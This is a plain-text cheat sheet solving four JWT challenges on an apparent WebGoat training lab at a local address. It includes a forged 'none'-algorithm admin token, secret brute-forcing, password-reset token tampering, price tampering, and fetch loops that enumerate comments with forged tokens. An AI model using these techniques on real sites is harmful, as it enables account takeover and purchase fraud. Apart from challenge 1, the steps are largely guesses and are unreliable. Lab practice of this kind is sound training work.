â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ALL 4 JWT CHALLENGES - QUICK SOLUTION GUIDE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

PowerShell Script: .\jwt_automation.ps1 (already running)
HTML Tool: jwt_complete_toolkit.html (already open)

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ¯ CHALLENGE 1: BECOME ADMIN & RESET VOTES âœ… WORKING SOLUTION
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â–¡ Step 1: F12 > Application > Cookies > http://192.168.254.112:8001
â–¡ Step 2: Copy "access_token" value
â–¡ Step 3: Replace with: eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
â–¡ Step 4: Double-click VALUE column, Delete, Paste, Enter
â–¡ Step 5: Click "Delete" button next to any user OR refresh (F5)
â–¡ DONE! âœ“

IMPORTANT NOTES:
âœ“ Cookie is HttpOnly - MUST edit in DevTools (not JavaScript)
âœ“ Token MUST end with dot: ...payload.
âœ“ Algorithm must be "none" (lowercase)
âœ“ Admin must be "true" (string, not boolean)

PowerShell Method (if you need different timestamp):
.\jwt_automation.ps1
Type: 6
Paste: YOUR_CURRENT_TOKEN
Result: Attack token copied to clipboard

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ”‘ CHALLENGE 2: ADMIN LOST PASSWORD (MEDIUM)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

TRY IN THIS ORDER:

ATTEMPT 1: Password in JWT Token
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Get any JWT token from the page
â–¡ PowerShell > Type 1 > Paste token > Enter
â–¡ Look for fields: "password", "secret", "resetToken"
â–¡ If found, try logging in with that password!

ATTEMPT 2: JWT Secret IS the Password
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Get JWT token
â–¡ PowerShell > Type 8 > Paste token > Enter
â–¡ Wait for brute force (tries common passwords)
â–¡ If secret found (e.g., "webgoat"), try logging in:
   Username: admin
   Password: [found_secret]

ATTEMPT 3: Password Reset Tampering
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Click "Reset Password" for YOUR account
â–¡ Capture the reset JWT token (check email/URL/response)
â–¡ PowerShell > Type 10 > Paste token
â–¡ Target username: admin
â–¡ Choose option: 3 (algorithm none)
â–¡ Use tampered token to set admin password:

curl -X POST http://192.168.254.112:8001/WebGoat/JWT/reset-password \
  -H "Authorization: Bearer TAMPERED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "mynewpass123"}'

â–¡ Login: admin / mynewpass123

MOST LIKELY: The secret is "webgoat" or "password"

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ’° CHALLENGE 3: BUY SAMSUNG PHONE FOR FREE (MEDIUM)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â–¡ Step 1: Add Samsung Phone to cart
â–¡ Step 2: Go to checkout (DON'T complete yet)
â–¡ Step 3: F12 > Network tab > Clear > Click "Proceed to Checkout"
â–¡ Step 4: Find request with price info (look for POST to /checkout or /cart)
â–¡ Step 5: Copy JWT token from that request
â–¡ Step 6: PowerShell > Type 11 > Paste token
â–¡ Step 7: Field name: price
â–¡ Step 8: Value: 0
â–¡ Step 9: Copy tampered token
â–¡ Step 10: Replace in browser OR use console:

fetch('http://192.168.254.112:8001/WebGoat/JWT/checkout', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer TAMPERED_TOKEN',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    item: 'Samsung Phone',
    price: 0,
    quantity: 1
  })
}).then(r => r.json()).then(console.log)

â–¡ DONE! Phone purchased for $0 âœ“

Other fields to try if "price" doesn't work:
- total: 0
- amount: 0
- discount: 100

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸš© CHALLENGE 4: FIND FLAG IN PHOTO COMMENTS (HARD)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â–¡ Step 1: Go to photo comments section
â–¡ Step 2: Post a test comment to trigger JWT token
â–¡ Step 3: F12 > Network > Find comment request
â–¡ Step 4: Copy JWT token
â–¡ Step 5: PowerShell > Type 1 > Paste token (decode to see structure)
â–¡ Step 6: Look for access control fields:
   - "canViewFlag": false
   - "isAdmin": false
   - "accessLevel": 1
â–¡ Step 7: Tamper token to gain access:
   PowerShell > Type 2 (Make Admin)
   OR
   Type 11 > Field: canViewFlag > Value: true
â–¡ Step 8: Fetch all comments with tampered token:

fetch('http://192.168.254.112:8001/WebGoat/JWT/comments', {
  headers: {
    'Authorization': 'Bearer TAMPERED_TOKEN'
  }
}).then(r => r.json()).then(data => {
  console.log('All comments:', data);
  // Look for flag in response
  JSON.stringify(data).match(/flag\{.*?\}/)
})

â–¡ Step 9: Try fetching specific comment IDs:

for(let i=1; i<=100; i++) {
  fetch(`http://192.168.254.112:8001/WebGoat/JWT/comments/${i}`, {
    headers: {'Authorization': 'Bearer TAMPERED_TOKEN'}
  })
  .then(r => r.json())
  .then(d => {
    if(JSON.stringify(d).includes('flag')) {
      console.log(`FLAG FOUND IN COMMENT ${i}:`, d);
    }
  })
  .catch(()=>{});
}

â–¡ Step 10: Submit found flag
â–¡ DONE! âœ“

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  âš¡ SUPER QUICK CHEAT CODES
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Get Token:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
F12 > Application > Cookies > access_token

OR

F12 > Console:
document.cookie.split(';').find(c=>c.includes('token'))

Decode Token:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
PowerShell: Type 1 > Paste

OR

Browser: jwt.io > Paste token

Make Admin:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
PowerShell: Type 2 > Paste

Replace Token:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
F12 > Application > Cookies > Double-click value > Paste > Enter > F5

Test if Admin:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
F12 > Console:
fetch('http://192.168.254.112:8001/WebGoat/JWT/admin')
  .then(r=>r.json()).then(console.log)

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ“ ATTACK DECISION TREE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Got JWT Token?
â”‚
â”œâ”€> Try PowerShell Option 2 (Make Admin)
â”‚   â”œâ”€> Works? â†’ Complete challenge! âœ“
â”‚   â””â”€> Fails? â†’ Try Option 6 (Algorithm "none")
â”‚       â”œâ”€> Works? â†’ Complete challenge! âœ“
â”‚       â””â”€> Fails? â†’ Try Option 8 (Brute Force)
â”‚           â””â”€> Found secret? â†’ Option 9 (Sign new token)
â”‚               â””â”€> Complete challenge! âœ“
â”‚
â””â”€> If all fails: Read jwt_troubleshooting.txt

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ’¾ SAVE THESE COMMANDS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# Get cookie value
document.cookie.split(';').find(c=>c.includes('access_token'))

# Replace cookie
document.cookie = "access_token=NEW_TOKEN; path=/"; location.reload();

# Reset votes
fetch('http://192.168.254.112:8001/WebGoat/JWT/votings/reset', {
  method: 'POST'
}).then(r=>r.json()).then(console.log)

# Buy for free
fetch('http://192.168.254.112:8001/WebGoat/JWT/checkout', {
  method: 'POST',
  headers: {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'},
  body: JSON.stringify({item: 'Samsung Phone', price: 0, quantity: 1})
}).then(r=>r.json()).then(console.log)

# Get comments
fetch('http://192.168.254.112:8001/WebGoat/JWT/comments', {
  headers: {'Authorization': 'Bearer TOKEN'}
}).then(r=>r.json()).then(console.log)

# Search for flag in all comments
for(let i=1; i<=100; i++) {
  fetch(`http://192.168.254.112:8001/WebGoat/JWT/comments/${i}`, {
    headers: {'Authorization': 'Bearer TOKEN'}
  }).then(r=>r.json()).then(d=>{
    if(JSON.stringify(d).includes('flag')) console.log('FOUND:', d)
  }).catch(()=>{})
}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  âœ… COMPLETION CHECKLIST
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

â–¡ Challenge 1: Become Admin & Reset Votes
  Method: Tamper admin: false â†’ true
  Status: __________

â–¡ Challenge 2: Admin Lost Password  
  Method: Brute force or password reset tampering
  Status: __________

â–¡ Challenge 3: Buy Samsung for Free
  Method: Tamper price: 999 â†’ 0
  Status: __________

â–¡ Challenge 4: Find Flag in Comments
  Method: Tamper for admin access â†’ fetch comments
  Status: __________

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  ğŸ†˜ IF YOU GET STUCK
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. Read: jwt_challenge1_walkthrough.txt (detailed step-by-step)
2. Read: jwt_troubleshooting.txt (common issues)
3. Check: jwt_payloads_library.txt (more examples)
4. Try: HTML tool (jwt_complete_toolkit.html) for visual interface

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

START WITH CHALLENGE 1 - IT'S THE EASIEST!

PowerShell is running â†’ Type 2 â†’ Paste token â†’ Replace in browser â†’ Done!

You got this! ğŸ”ğŸ¯
